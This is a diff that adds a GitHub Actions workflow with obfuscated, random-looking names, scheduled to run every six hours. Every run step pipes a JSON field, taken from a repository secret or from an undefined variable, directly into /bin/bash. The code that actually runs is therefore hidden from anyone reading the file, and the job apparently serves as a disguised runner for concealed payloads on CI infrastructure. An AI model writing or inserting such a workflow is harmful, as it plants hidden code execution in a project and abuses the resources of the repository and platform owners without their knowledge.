@@ -1,0 +1,22 @@
+name: dongcunruisa
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '19 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: dongcunruisa
+        env:
+          qlqqx28495: ${{ secrets.qlqqx28495 }}
+        run: |
+          echo $qlqqx28495 | jq -r .exfr75 | /bin/bash
+          echo $zydd23 | jq -r .u337 | /bin/bash
+          echo $gijq0066 | jq -r .rezpo7 | /bin/bash
+          echo $obl4028 | jq -r .qby3 | /bin/bash
+          echo $bcsgm85 | jq -r .ufz883 | /bin/bash
+          echo $ko00 | jq -r .jb3454 | /bin/bash
+          echo $r2766 | jq -r .a7333 | /bin/bash
+
